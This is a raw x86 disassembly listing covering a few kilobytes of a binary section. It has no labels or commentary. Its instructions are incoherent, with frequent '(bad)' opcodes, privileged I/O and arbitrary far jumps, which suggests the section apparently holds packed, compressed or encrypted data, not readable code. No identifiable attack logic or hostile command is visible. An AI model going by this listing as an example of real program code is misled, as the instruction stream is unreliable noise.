  40bc7d:	and    eax,0xe472f535
  40bc82:	aad    0x48
  40bc84:	ficom  DWORD PTR [edi+esi*1-0x4a]
  40bc88:	mov    eax,ds:0x71444626
  40bc8d:	mov    al,ds:0xa1ea98db
  40bc92:	lock jnp 0x40bc59
  40bc95:	rcr    DWORD PTR [eax],cl
  40bc97:	sbb    DWORD PTR [ecx+0x8],0xffffffe2
  40bc9b:	or     al,0x8e
  40bc9d:	shl    BYTE PTR [esi+0x28],1
  40bca0:	(bad)  
  40bca1:	icebp  
  40bca2:	es mov ebx,0x8b236388
  40bca8:	mov    bl,0x23
  40bcaa:	psrlq  mm3,QWORD PTR [edx]
  40bcad:	loopne 0x40bc42
  40bcaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb0:	out    dx,eax
  40bcb1:	lods   eax,DWORD PTR ds:[esi]
  40bcb2:	sub    eax,0x5bbc4657
  40bcb7:	dec    ecx
  40bcb8:	in     eax,0x50
  40bcba:	or     BYTE PTR [ebx],al
  40bcbc:	sbb    al,0x1d
  40bcbe:	leave  
  40bcbf:	sub    eax,0x69a4c77c
  40bcc4:	and    al,0xa8
  40bcc6:	retf   
  40bcc7:	sub    al,BYTE PTR [ebx]
  40bcc9:	sub    al,0x11
  40bccb:	(bad)  
  40bccc:	or     al,0x9c
  40bcce:	mov    al,0x54
  40bcd0:	or     edi,eax
  40bcd2:	ret    
  40bcd3:	fmul   QWORD PTR [ecx+0x6c]
  40bcd6:	ds push edx
  40bcd8:	sbb    bh,0x64
  40bcdb:	je     0x40bd1d
  40bcdd:	and    eax,0xd1918ecf
  40bce2:	dec    edx
  40bce3:	scas   eax,DWORD PTR es:[edi]
  40bce4:	cmp    ah,BYTE PTR [edi-0x4a132cb7]
  40bcea:	sar    BYTE PTR [ebx-0x4c],1
  40bced:	(bad)  
  40bcee:	mov    edi,0x63fc99b5
  40bcf3:	outs   dx,BYTE PTR ds:[esi]
  40bcf4:	push   ecx
  40bcf5:	outs   dx,BYTE PTR ds:[esi]
  40bcf6:	jmp    FWORD PTR [edi-0x6b]
  40bcf9:	std    
  40bcfa:	test   DWORD PTR [ebx+0x620911ef],edi
  40bd00:	dec    eax
  40bd01:	pop    ebx
  40bd02:	jo     0x40bd5e
  40bd04:	adc    eax,0x2a208918
  40bd09:	out    0x3a,al
  40bd0b:	sub    ah,BYTE PTR [edi+0x528b7b11]
  40bd11:	int    0xb4
  40bd13:	in     al,dx
  40bd14:	inc    edi
  40bd15:	cwde   
  40bd16:	mov    edi,0x5ed8d544
  40bd1b:	out    dx,al
  40bd1c:	push   0x5
  40bd1e:	cmc    
  40bd1f:	inc    eax
  40bd20:	out    dx,eax
  40bd21:	mov    esi,0x2cab2fe2
  40bd26:	popa   
  40bd27:	push   0xa6b1b36b
  40bd2c:	mov    ebp,ecx
  40bd2e:	sub    eax,0x69df7a3e
  40bd33:	push   cs
  40bd34:	and    ebp,ebp
  40bd36:	push   esi
  40bd37:	adc    esp,DWORD PTR [ecx]
  40bd39:	pop    ecx
  40bd3a:	in     al,0x8a
  40bd3c:	fs out 0xa5,eax
  40bd3f:	addr16 (bad) 
  40bd41:	sub    ebx,DWORD PTR [eax-0x5f860d8e]
  40bd47:	ret    0x8c6a
  40bd4a:	add    ah,BYTE PTR [eax+0x2ab65599]
  40bd50:	sti    
  40bd51:	mov    dl,BYTE PTR [edx+0x7bd3e6f7]
  40bd57:	xchg   edi,eax
  40bd58:	js     0x40bd74
  40bd5a:	ret    0x195c
  40bd5d:	nop
  40bd5e:	jle    0x40bd8e
  40bd60:	repnz mov al,ds:0x4aee7195
  40bd66:	pop    esp
  40bd67:	mov    esp,0xd21aa7e2
  40bd6c:	cmp    BYTE PTR [eax],0xe8
  40bd6f:	and    ebx,DWORD PTR [edi-0x50]
  40bd72:	fdivr  DWORD PTR [edx-0x39]
  40bd75:	push   es
  40bd76:	test   eax,0xb63d67ce
  40bd7b:	xor    BYTE PTR ds:0x540a8969,0x86
  40bd82:	test   al,0xe3
  40bd84:	(bad)  
  40bd86:	call   0x5e12fc4e
  40bd8b:	outs   dx,BYTE PTR ds:[esi]
  40bd8c:	pop    ebp
  40bd8d:	jecxz  0x40bd1e
  40bd8f:	pop    esp
  40bd90:	jmp    0x702a:0x83cd89f2
  40bd97:	mov    edx,0x1a0a9dbc
  40bd9c:	pop    esi
  40bd9d:	bound  ebx,QWORD PTR [edx+ebx*1-0x40]
  40bda1:	test   BYTE PTR [esp+ebp*1+0x1c],bh
  40bda5:	lods   eax,DWORD PTR ds:[esi]
  40bda6:	xchg   edi,eax
  40bda7:	dec    eax
  40bda8:	mov    cl,0x5
  40bdaa:	dec    edx
  40bdab:	data16 int 0x15
  40bdae:	mov    dl,0xaf
  40bdb0:	mov    edx,0x50528bad
  40bdb5:	jecxz  0x40bd69
  40bdb7:	call   0xadf0dd3
  40bdbc:	cwde   
  40bdbd:	mov    dh,0xe7
  40bdbf:	mov    bl,dh
  40bdc1:	cld    
  40bdc2:	inc    ecx
  40bdc3:	cld    
  40bdc4:	rcl    DWORD PTR [ebx+0x13],cl
  40bdc7:	or     al,0xca
  40bdc9:	mov    cl,0x27
  40bdcb:	or     eax,0xa2b6c893
  40bdd0:	inc    edx
  40bdd1:	repz popa 
  40bdd3:	inc    ecx
  40bdd4:	loopne 0x40be10
  40bdd6:	int3   
  40bdd7:	popf   
  40bdd8:	sub    eax,DWORD PTR [edx+0x42b2c8e1]
  40bdde:	xchg   ebx,eax
  40bddf:	cmc    
  40bde0:	xchg   ebx,eax
  40bde1:	mov    ebp,0x58b74a7a
  40bde6:	mov    eax,ds:0x1d21dab8
  40bdeb:	cld    
  40bdec:	aam    0xf9
  40bdee:	inc    ebx
  40bdef:	lods   eax,DWORD PTR ds:[esi]
  40bdf0:	inc    edx
  40bdf1:	pop    ebx
  40bdf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdf3:	pcmpgtd mm6,QWORD PTR [edi+eax*4]
  40bdf7:	xor    eax,0x35eb73ba
  40bdfc:	xchg   BYTE PTR [ebx],cl
  40bdfe:	jp     0x40be48
  40be00:	adc    al,0x4c
  40be02:	and    dh,0x4b
  40be05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be06:	scas   al,BYTE PTR es:[edi]
  40be07:	jo     0x40bdf5
  40be09:	push   edi
  40be0a:	(bad)  
  40be0b:	call   0x4054ef2d
  40be10:	dec    esp
  40be11:	inc    eax
  40be12:	gs xchg ecx,eax
  40be14:	push   ecx
  40be15:	sbb    cl,BYTE PTR [eax+ebx*1+0x4bd4d056]
  40be1c:	jmp    0x40bdf3
  40be1e:	mov    ebx,0x55291fd4
  40be23:	call   0x32f52cb5
  40be28:	jmp    0xdfd9:0xfb04de6e
  40be2f:	sar    DWORD PTR [edi+0x15],cl
  40be32:	xchg   ebp,eax
  40be33:	jmp    0x3773c590
  40be38:	xchg   ecx,eax
  40be3a:	push   ecx
  40be3b:	mov    esi,edx
  40be3d:	push   0x9fee0a92
  40be42:	(bad)  
  40be43:	push   ebp
  40be44:	div    BYTE PTR [ebp+0x3e]
  40be47:	lds    esi,FWORD PTR [edx-0x3b9445ac]
  40be4d:	dec    edi
  40be4e:	sub    ebx,DWORD PTR fs:[ebx]
  40be51:	pop    esp
  40be52:	imul   edx,eax,0x26
  40be55:	sbb    esi,DWORD PTR [edi+esi*4]
  40be58:	push   eax
  40be59:	add    eax,0x934df8a1
  40be5e:	stos   DWORD PTR es:[edi],eax
  40be5f:	inc    eax
  40be60:	dec    eax
  40be61:	push   eax
  40be62:	adc    BYTE PTR [edi+0x6e],dl
  40be65:	shr    DWORD PTR [ebp-0x515ea314],cl
  40be6b:	(bad)  
  40be6c:	js     0x40bea9
  40be6e:	jne    0x40be2a
  40be70:	aaa    
  40be71:	addr16 mov ah,0x69
  40be74:	push   0xd5da69fb
  40be79:	add    BYTE PTR fs:[eax+0x65],bl
  40be7d:	jmp    0x40beee
  40be7f:	jnp    0x40be43
  40be81:	movhps QWORD PTR [ebx],xmm0
  40be84:	cmp    eax,0xe18a3c29
  40be89:	ds dec edx
  40be8b:	cli    
  40be8c:	sbb    esp,esi
  40be8e:	pop    edi
  40be8f:	jmp    0x4d22:0x7b9d8ec4
  40be96:	fild   DWORD PTR ss:[ecx]
  40be99:	cwde   
  40be9a:	jae    0x40beb7
  40be9c:	bound  ebp,QWORD PTR [ebp-0x65d0cbef]
  40bea2:	mov    WORD PTR [ebx+edx*2],?
  40bea5:	xor    esi,eax
  40bea7:	daa    
  40bea8:	out    dx,eax
  40bea9:	(bad)  
  40beaa:	js     0x40be78
  40beac:	mov    ah,0xbe
  40beae:	pop    es
  40beaf:	or     ebx,DWORD PTR [ebx+eax*8-0x1b018d69]
  40beb6:	jne    0x40bf01
  40beb8:	sbb    ch,BYTE PTR [edx+0x24e08cf]
  40bebe:	add    edi,DWORD PTR [edx+0xe]
  40bec1:	shl    BYTE PTR gs:[ebp+ebp*4-0x1742ecbc],cl
  40bec9:	adc    esp,ecx
  40becb:	sub    dl,ch
  40becd:	fist   WORD PTR [esi]
  40becf:	addr16 jl 0xdeab347d
  40bed6:	mov    BYTE PTR [eax-0x48],al
  40bed9:	retf   0xe1c
  40bedc:	sti    
  40bedd:	nop
  40bede:	and    dl,bl
  40bee0:	xor    eax,0x2fc4d26
  40bee5:	inc    eax
  40bee6:	xchg   esp,eax
  40bee7:	xor    eax,0x223b1cb4
  40beec:	mov    eax,ds:0xda694d38
  40bef1:	inc    edi
  40bef2:	jecxz  0x40be8f
  40bef4:	sbb    ah,BYTE PTR [eax-0x7e90ac55]
  40befa:	aaa    
  40befb:	pop    esp
  40befc:	fs popf 
  40befe:	dec    ecx
  40beff:	test   al,0x4a
  40bf01:	sub    ch,ch
  40bf03:	jnp    0x40bedc
  40bf05:	pusha  
  40bf06:	inc    esi
  40bf07:	cmc    
  40bf08:	ins    BYTE PTR es:[edi],dx
  40bf09:	sub    BYTE PTR [edx],0x2e
  40bf0c:	sbb    ebx,DWORD PTR [ebx+0x2a2ae51f]
  40bf12:	stos   DWORD PTR es:[edi],eax
  40bf13:	test   DWORD PTR [esi+edx*4+0x42],esp
  40bf17:	mov    dh,0x69
  40bf19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf1a:	frstpm(287 only) 
  40bf1c:	sbb    BYTE PTR [esi+ebx*1+0x57],dl
  40bf20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf21:	cmc    
  40bf22:	out    0xbb,al
  40bf24:	push   0xffffffca
  40bf26:	(bad)  
  40bf27:	push   0x5d
  40bf29:	bound  esp,QWORD PTR gs:[eax]
  40bf2c:	xor    esi,DWORD PTR [ebx-0x4e]
  40bf2f:	inc    DWORD PTR [ebp-0x7df3140f]
  40bf35:	ror    BYTE PTR [edx-0x55],0x46
  40bf39:	add    BYTE PTR [ebx-0x59],dl
  40bf3c:	and    edi,0xebf11808
  40bf42:	aad    0xcc
  40bf44:	fs scas al,BYTE PTR es:[edi]
  40bf46:	push   esi
  40bf47:	inc    edi
  40bf48:	lods   al,BYTE PTR ds:[esi]
  40bf49:	jl     0x40bf95
  40bf4b:	and    esp,DWORD PTR [esi]
  40bf4d:	inc    ebx
  40bf4e:	mov    bl,0x78
  40bf50:	push   0xa930f77
  40bf55:	push   ecx
  40bf56:	daa    
  40bf57:	jl     0x40bf51
  40bf59:	pop    ss
  40bf5a:	sbb    BYTE PTR [edx],al
  40bf5c:	xor    eax,0x29c7df99
  40bf61:	lds    ecx,FWORD PTR [edx-0x7d]
  40bf64:	bound  ebx,QWORD PTR [edi+ebp*2-0x5af30f92]
  40bf6b:	xchg   esi,eax
  40bf6c:	xor    edi,ebx
  40bf6e:	or     eax,0x6d93b238
  40bf73:	push   0xffffffe6
  40bf75:	in     al,dx
  40bf76:	pop    esi
  40bf77:	xor    al,ah
  40bf79:	enter  0x4d4c,0x6d
  40bf7d:	mov    ch,0x44
  40bf7f:	out    dx,al
  40bf80:	ja     0x40bf6d
  40bf82:	cwde   
  40bf83:	pop    edi
  40bf84:	and    al,0x8c
  40bf86:	stos   DWORD PTR es:[edi],eax
  40bf87:	inc    esi
  40bf88:	inc    edi
  40bf89:	cmp    bl,BYTE PTR [ecx+ecx*1+0x44ab380d]
  40bf90:	fucomp st(4)
  40bf92:	lea    eax,[edx-0x1e]
  40bf95:	xchg   ebp,eax
  40bf96:	push   esi
  40bf97:	push   esi
  40bf98:	cli    
  40bf99:	adc    BYTE PTR [edx+0x7b],0xe1
  40bf9d:	mov    si,0x2345
  40bfa1:	push   ecx
  40bfa2:	out    0x52,al
  40bfa4:	pop    eax
  40bfa5:	push   edi
  40bfa6:	xlat   BYTE PTR ds:[ebx]
  40bfa7:	inc    edx
  40bfa8:	mov    ebp,0x21727806
  40bfad:	and    eax,0xa6305256
  40bfb2:	cmp    DWORD PTR ds:0x13efddab,eax
  40bfb8:	xchg   esi,eax
  40bfb9:	add    BYTE PTR [ebx+0x4349c06f],ch
  40bfbf:	mov    al,0xff
  40bfc1:	jae    0x40bf82
  40bfc3:	mov    eax,ds:0x7a41cc77
  40bfc8:	mov    ebp,esi
  40bfca:	icebp  
  40bfcb:	xchg   esp,eax
  40bfcc:	or     esi,DWORD PTR ds:0x1672be1
  40bfd2:	mov    cl,0x20
  40bfd4:	jmp    FWORD PTR [esi+0x33507ff4]
  40bfda:	int    0xb7
  40bfdc:	outs   dx,BYTE PTR ds:[esi]
  40bfdd:	scas   al,BYTE PTR es:[edi]
  40bfde:	imul   edx,DWORD PTR [edi+0x4],0x7302ead6
  40bfe5:	fsubr  st(4),st
  40bfe7:	pop    ebx
  40bfe8:	test   ch,bh
  40bfea:	mov    BYTE PTR [edi+0x52],dh
  40bfed:	pop    esp
  40bfee:	out    dx,eax
  40bfef:	into   
  40bff0:	mov    ebx,0x9e072d70
  40bff5:	push   ds
  40bff6:	add    eax,0xf8345170
  40bffb:	sahf   
  40bffc:	sti    
  40bffd:	dec    ebx
  40bffe:	jp     0x40c028
  40c000:	in     al,0xdb
  40c002:	das    
  40c003:	hlt    
  40c004:	fdiv   QWORD PTR [esi+0x2f0a34d0]
  40c00a:	adc    esi,DWORD PTR [edi-0x3]
  40c00d:	add    edi,esp
  40c00f:	adc    BYTE PTR [ecx+0x32188d2f],0xd6
  40c016:	mov    ebp,0x9716777
  40c01b:	stos   BYTE PTR es:[edi],al
  40c01c:	and    al,0x78
  40c01e:	mov    ds:0xc95a0888,eax
  40c023:	das    
  40c024:	pop    edi
  40c025:	mov    ecx,0xfeae5b67
  40c02a:	dec    dx
  40c02c:	or     edi,DWORD PTR ds:0x19cae225
  40c032:	xchg   ebp,eax
  40c033:	dec    ebp
  40c034:	das    
  40c035:	(bad)  [eax-0x3]
  40c038:	out    dx,eax
  40c039:	or     BYTE PTR [edx+esi*1],0x52
  40c03d:	das    
  40c03e:	cs scas al,BYTE PTR es:[edi]
  40c040:	popa   
  40c041:	cmp    edi,DWORD PTR [esi+0x252e42f6]
  40c047:	scas   al,BYTE PTR es:[edi]
  40c048:	jnp    0x40c005
  40c04a:	mov    ecx,0x16a10cf7
  40c04f:	es push 0xaa00cb38
  40c055:	jnp    0x40c056
  40c057:	sbb    eax,edx
  40c059:	(bad)  
  40c05a:	jno    0x40c0d0
  40c05c:	dec    edi
  40c05d:	mov    ecx,0x3800bb01
  40c062:	cmp    bh,al
  40c064:	mul    BYTE PTR [ecx+0x727453ad]
  40c06a:	icebp  
  40c06b:	cwde   
  40c06c:	or     dl,BYTE PTR [edx+0x5f83000c]
  40c072:	mov    ch,0xfb
  40c074:	nop
  40c075:	out    dx,eax
  40c076:	out    dx,al
  40c077:	retf   0x9778
  40c07a:	fwait
  40c07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c07c:	aad    0x4d
  40c07e:	push   ecx
  40c07f:	jno    0x40c0f3
  40c081:	add    al,0x46
  40c083:	or     al,0x7b
  40c085:	push   eax
  40c086:	cmc    
  40c087:	in     al,dx
  40c088:	mov    cl,0x3c
  40c08a:	xchg   eax,ebx
  40c08c:	jns    0x40c0c2
  40c08e:	call   0xe7025648
  40c093:	push   0xffffffb0
  40c095:	push   edi
  40c096:	jecxz  0x40c04c
  40c098:	adc    bl,bh
  40c09a:	push   ds
  40c09b:	popf   
  40c09c:	push   esi
  40c09d:	cli    
  40c09e:	call   0xe565:0x98a9fcc0
  40c0a5:	out    dx,al
  40c0a6:	aas    
  40c0a7:	stc    
  40c0a8:	cmc    
  40c0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0aa:	iret   
  40c0ab:	fucom  st(1)
  40c0ad:	fdiv   DWORD PTR [edi-0xe]
  40c0b0:	call   0x1dc1eedd
  40c0b5:	xchg   edi,eax
  40c0b6:	clc    
  40c0b7:	xchg   edi,eax
  40c0b8:	lock fimul WORD PTR [edx+esi*4+0x2faf3a3]
  40c0c0:	std    
  40c0c1:	das    
  40c0c2:	das    
  40c0c3:	popf   
  40c0c4:	push   edx
  40c0c5:	mov    bh,0x8b
  40c0c7:	pushf  
  40c0c8:	ret    
  40c0c9:	js     0x40c04d
  40c0cb:	shl    DWORD PTR [ecx+0x60c33ea1],cl
  40c0d1:	pop    ebp
  40c0d2:	cmp    BYTE PTR [eax],cl
  40c0d4:	adc    BYTE PTR [esi],ah
  40c0d6:	ja     0x40c088
  40c0d8:	cli    
  40c0d9:	xchg   ecx,eax
  40c0da:	mov    dh,0x54
  40c0dc:	add    al,0xa7
  40c0de:	mov    ebp,DWORD PTR gs:[edi+edx*1-0x57]
  40c0e3:	pop    ebx
  40c0e4:	push   0xaa27363b
  40c0e9:	ret    
  40c0ea:	rcr    BYTE PTR [ebx+0x1e],cl
  40c0ed:	les    edx,FWORD PTR [edi+eiz*8-0x18]
  40c0f1:	xor    al,0xdc
  40c0f3:	adc    eax,0x92740593
  40c0f8:	ror    eax,0xf7
  40c0fb:	mov    eax,0x6a966b8c
  40c100:	xor    DWORD PTR [ebp+0xa2f5f3c],ebx
  40c106:	rcl    DWORD PTR [bx],1
  40c109:	addr16 into 
  40c10b:	shl    BYTE PTR [esi-0x31dcba84],0xf2
  40c112:	jl     0x40c0d7
  40c114:	out    0x80,al
  40c116:	push   0x46
  40c118:	jb     0x40c119
  40c11a:	loope  0x40c0dc
  40c11c:	and    al,0x5c
  40c11e:	ret    
  40c11f:	xchg   edx,eax
  40c120:	dec    ecx
  40c121:	(bad)  
  40c122:	retf   
  40c123:	enter  0xf265,0xd5
  40c127:	jmp    0x7016:0xef11407d
  40c12e:	sub    dl,BYTE PTR [ecx+0x22]
  40c131:	jmp    0x2b9f:0xa1e45b57
  40c138:	jns    0x40c11b
  40c13a:	mov    edi,0xda460aff
  40c13f:	push   edi
  40c141:	adc    esp,esp
  40c143:	jge    0x40c158
  40c145:	mov    esp,DWORD PTR [ebp+0x5f]
  40c148:	cmp    cl,dl
  40c14a:	enter  0x2f98,0x6
  40c14e:	mov    BYTE PTR [edx],ch
  40c150:	push   ds
  40c151:	xor    cl,dl
  40c153:	stc    
  40c154:	adc    bl,BYTE PTR [edi+edi*2-0x4d]
  40c158:	pushf  
  40c159:	les    esi,FWORD PTR [eax]
  40c15b:	push   esp
  40c15c:	push   ecx
  40c15d:	in     eax,0x85
  40c15f:	fidivr DWORD PTR [edi-0x7dcf97fc]
  40c165:	push   0x87045b3a
  40c16a:	mov    BYTE PTR [ebp-0x7daa0e2d],dl
  40c170:	push   0xffffffcf
  40c172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c173:	mov    ch,0xf6
  40c175:	add    DWORD PTR [edx+eiz*2],ebp
  40c178:	sub    DWORD PTR [edi],ebp
  40c17a:	sahf   
  40c17b:	xchg   edx,eax
  40c17c:	jge    0x40c125
  40c17e:	mov    WORD PTR [esi],ds
  40c180:	sti    
  40c181:	cmp    BYTE PTR [edi+0x47],bh
  40c184:	xchg   BYTE PTR [esi+edx*8],dh
  40c187:	popf   
  40c188:	scas   al,BYTE PTR es:[edi]
  40c189:	adc    eax,0xa496664e
  40c18e:	dec    esp
  40c18f:	shl    bl,cl
  40c191:	add    BYTE PTR [ecx-0x2a3e1751],cl
  40c197:	mov    dh,0xe5
  40c199:	out    0xf6,al
  40c19b:	sub    eax,0x1f548d8
  40c1a0:	mov    WORD PTR [edi],ss
  40c1a2:	mov    ds:0x4385bacf,eax
  40c1a7:	imul   esi,DWORD PTR [edi+0x47],0x58
  40c1ab:	and    eax,0x6b
  40c1ae:	jns    0x40c1ac
  40c1b0:	fidivr WORD PTR [ecx]
  40c1b2:	in     al,dx
  40c1b3:	mov    bh,BYTE PTR [esi]
  40c1b5:	adc    ecx,edx
  40c1b7:	dec    ebx
  40c1b8:	xchg   edi,eax
  40c1b9:	jne    0x40c193
  40c1bb:	xor    BYTE PTR [eax+0x3f],0x2d
  40c1bf:	les    esi,FWORD PTR [ebx+0x10]
  40c1c2:	pushf  
  40c1c3:	xchg   ecx,eax
  40c1c4:	xchg   edx,eax
  40c1c5:	aaa    
  40c1c6:	ds sub eax,0xf7e8a2b
  40c1cc:	xchg   DWORD PTR ds:0x4675a640,ecx
  40c1d2:	push   ebp
  40c1d3:	jo     0x40c163
  40c1d5:	pop    ds
  40c1d6:	ror    esp,cl
  40c1d8:	dec    ecx
  40c1d9:	sub    eax,0x2d5d5fca
  40c1de:	pusha  
  40c1df:	jmp    0xea13:0x3fb93c42
  40c1e6:	sar    DWORD PTR [edi],0xf7
  40c1e9:	in     eax,dx
  40c1ea:	or     ebp,DWORD PTR [ebx+0x695c2795]
  40c1f0:	inc    ebp
  40c1f1:	adc    DWORD PTR [esi+edx*2-0x45bb1ac7],esp
  40c1f8:	adc    BYTE PTR [edi-0x24bc95ac],ah
  40c1fe:	fcomi  st,st(6)
  40c200:	push   ebp
  40c201:	repz add edi,DWORD PTR [ecx-0x4a140005]
  40c208:	mov    ebp,0xff00755f
  40c20d:	setl   BYTE PTR [ebx+0x4b70c70e]
  40c214:	cwde   
  40c215:	jl     0x40c1b1
  40c217:	das    
  40c218:	call   0x7dd2:0x87014657
  40c21f:	or     BYTE PTR [ebp-0x614347f1],cl
  40c225:	jno    0x40c241
  40c227:	out    dx,al
  40c228:	xchg   esp,eax
  40c229:	add    al,0x2
  40c22b:	ficom  WORD PTR [ebp+0x27]
  40c22e:	dec    edx
  40c22f:	pop    ss
  40c230:	adc    eax,0x55397fd5
  40c235:	xchg   ebp,eax
  40c236:	rol    BYTE PTR [ebx],1
  40c238:	scas   eax,DWORD PTR es:[edi]
  40c239:	popa   
  40c23a:	sbb    edi,esi
  40c23c:	inc    eax
  40c23d:	sbb    ah,BYTE PTR [edi+0x77]
  40c240:	sub    dh,BYTE PTR [ebx-0x59]
  40c243:	dec    edx
  40c244:	ins    BYTE PTR es:[edi],dx
  40c245:	push   0x7220d539
  40c24a:	fdiv   QWORD PTR [edi-0x76460395]
  40c250:	dec    ebx
  40c251:	pop    es
  40c252:	aam    0x54
  40c254:	jae    0x40c2c9
  40c256:	mov    DWORD PTR [edi+ebp*4+0x75],edx
  40c25a:	xor    DWORD PTR [esi-0x501403cd],edx
  40c260:	or     DWORD PTR [edx+0x69b07e0a],esp
  40c266:	xchg   edx,eax
  40c267:	jecxz  0x40c24c
  40c269:	sbb    DWORD PTR [eax+eax*1+0x58],ebx
  40c26d:	outs   dx,BYTE PTR ds:[esi]
  40c26e:	dec    esp
  40c26f:	mov    esp,0xa282b3f1
  40c274:	aad    0x6e
  40c276:	mov    ecx,0x4f3f4762
  40c27b:	(bad)  
  40c27d:	mov    ch,BYTE PTR [ebx-0x12]
  40c280:	mov    al,ds:0x1b4acb32
  40c285:	ret    
  40c286:	adc    eax,0xde6667b
  40c28b:	imul   esp,ecx,0x2d5ab6c8
  40c291:	push   edi
  40c292:	jge    0x40c29c
  40c294:	cmp    al,cl
  40c296:	scas   eax,DWORD PTR es:[edi]
  40c297:	and    al,BYTE PTR [ecx+ebp*8-0x7ab5d8cc]
  40c29e:	shr    BYTE PTR [esi+0x5a],0x45
  40c2a2:	push   ebx
  40c2a3:	xlat   BYTE PTR ds:[ebx]
  40c2a4:	xor    bl,BYTE PTR [eax+0x7316a932]
  40c2aa:	lods   al,BYTE PTR ds:[esi]
  40c2ab:	outs   dx,DWORD PTR ds:[esi]
  40c2ac:	popf   
  40c2ad:	daa    
  40c2ae:	cmp    BYTE PTR [edx-0xc],0xb1
  40c2b2:	add    DWORD PTR [eax],ebx
  40c2b4:	and    DWORD PTR [ebp+esi*1-0x2e],ebx
  40c2b8:	jecxz  0x40c2be
  40c2ba:	mov    edi,0x1466c168
  40c2bf:	in     al,dx
  40c2c0:	mov    al,0x40
  40c2c2:	dec    eax
  40c2c3:	or     DWORD PTR [edi],ebp
  40c2c5:	sub    ebp,esi
  40c2c7:	inc    ebp
  40c2c8:	cdq    
  40c2c9:	push   esi
  40c2ca:	or     ebp,DWORD PTR [ecx+0x507c7b0]
  40c2d0:	sar    BYTE PTR [ecx],cl
  40c2d2:	addr16 or ebp,ecx
  40c2d5:	jbe    0x40c34d
  40c2d7:	xor    DWORD PTR ds:[edx+0x358dc318],eax
  40c2de:	inc    esp
  40c2df:	mov    edx,0xb1df21fc
  40c2e4:	imul   edx,DWORD PTR [ebx-0x17],0x57
  40c2e8:	pop    ebx
  40c2e9:	(bad)
  40c2ed:	pop    edx
  40c2ee:	mov    ds:0xf07c0cc,eax
  40c2f3:	cmp    esi,DWORD PTR [ebx+0x41]
  40c2f6:	jns    0x40c2bc
  40c2f8:	or     DWORD PTR [ecx],edi
  40c2fa:	pop    esi
  40c2fb:	push   esi
  40c2fc:	repz push ds
  40c2fe:	push   ds
  40c2ff:	jmp    0x19b4:0xf2f527fa
  40c306:	ins    DWORD PTR es:[edi],dx
  40c307:	push   ebp
  40c308:	(bad)  
  40c309:	ficomp WORD PTR [esi+0x54d57958]
  40c30f:	xchg   esp,eax
  40c310:	fstp   st(3)
  40c312:	jbe    0x40c2e5
  40c314:	out    0x33,eax
  40c316:	mov    bh,BYTE PTR [eax]
  40c318:	fwait
  40c319:	test   BYTE PTR [ebx+0x3f14b586],dl
  40c31f:	xor    BYTE PTR [edi],ah
  40c321:	dec    edi
  40c322:	adc    DWORD PTR [edi-0x7e],esi
  40c325:	mov    al,ds:0x499f14d
  40c32a:	aaa    
  40c32b:	mov    al,0xbc
  40c32d:	mov    bl,0xcc
  40c32f:	js     0x40c2eb
  40c331:	clc    
  40c332:	test   eax,0xea84cb6e
  40c337:	and    BYTE PTR [ecx],0x16
  40c33a:	repnz pop edi
  40c33c:	ret    
  40c33d:	daa    
  40c33e:	fidiv  WORD PTR [ebp-0x73]
  40c341:	jns    0x40c373
  40c343:	or     dh,BYTE PTR [ebp+0x6594c358]
  40c349:	lods   al,BYTE PTR ds:[esi]
  40c34a:	inc    edi
  40c34b:	in     eax,dx
  40c34c:	pop    ds
  40c34d:	mov    bl,0xe
  40c34f:	mov    al,0xdd
  40c351:	cmp    bh,0xe2
  40c354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c355:	xor    al,0x4
  40c357:	(bad)  
  40c358:	cli    
  40c359:	mov    ebx,0x80f9db91
  40c35e:	mov    al,ds:0x2a6c4b94
  40c363:	sub    eax,0xeb5a8716
  40c368:	je     0x40c36f
  40c36a:	xor    edi,DWORD PTR [edx]
  40c36c:	lock imul ecx,DWORD PTR [eax],0xffffffcc
  40c370:	or     ch,al
  40c372:	inc    eax
  40c373:	bound  eax,QWORD PTR [ebx+0x4b]
  40c376:	lea    edi,[ecx+0x55]
  40c379:	rcl    BYTE PTR [edx-0x2e981155],cl
  40c37f:	dec    ecx
  40c380:	push   es
  40c381:	pop    esi
  40c382:	(bad)  
  40c383:	out    0x1f,al
  40c385:	ins    BYTE PTR es:[edi],dx
  40c386:	dec    edx
  40c387:	and    eax,0x89e282ce
  40c38c:	loop   0x40c40a
  40c38e:	lea    edx,[eax+0x457f80f9]
  40c394:	xor    ebp,esp
  40c396:	sub    BYTE PTR [ebx-0x4c],al
  40c399:	lds    ebx,FWORD PTR [ebx-0x6f]
  40c39c:	iret   
  40c39d:	xchg   edx,eax
  40c39e:	xor    ebx,DWORD PTR [edi+0x77]
  40c3a1:	mov    eax,0x2dd0b91d
  40c3a6:	js     0x40c3ff
  40c3a8:	jmp    0x40c33d
  40c3aa:	sub    bl,BYTE PTR [edx-0x339b3546]
  40c3b0:	out    0x7b,al
  40c3b2:	daa    
  40c3b3:	out    dx,eax
  40c3b4:	nop
  40c3b5:	mov    bl,0x56
  40c3b7:	imul   eax,edx,0xa5e83698
  40c3bd:	xor    DWORD PTR [esi],esi
  40c3bf:	push   edi
  40c3c0:	mov    cl,0xb4
  40c3c2:	lahf   
  40c3c3:	adc    al,BYTE PTR ds:0x6e81b358
  40c3c9:	(bad)  
  40c3ca:	fisttp WORD PTR [eax-0x7f]
  40c3cd:	pop    edx
  40c3ce:	inc    ebx
  40c3cf:	fsub   DWORD PTR [ebx-0x1e]
  40c3d2:	test   BYTE PTR [ecx-0x4f],ah
  40c3d5:	popa   
  40c3d6:	or     eax,0x889365f3
  40c3db:	mov    ebp,0x4dfcd536
  40c3e0:	sbb    al,0xcb
  40c3e2:	ficom  WORD PTR [eax+0x7a]
  40c3e5:	cmp    ah,al
  40c3e7:	and    cl,BYTE PTR [ecx-0x6b]
  40c3ea:	sub    DWORD PTR [ecx],eax
  40c3ec:	mov    esi,0xbf7f0a27
  40c3f1:	call   0x4737:0xf5441782
  40c3f8:	retf   
  40c3f9:	out    dx,eax
  40c3fa:	les    edx,FWORD PTR es:[edi]
  40c3fd:	pop    ecx
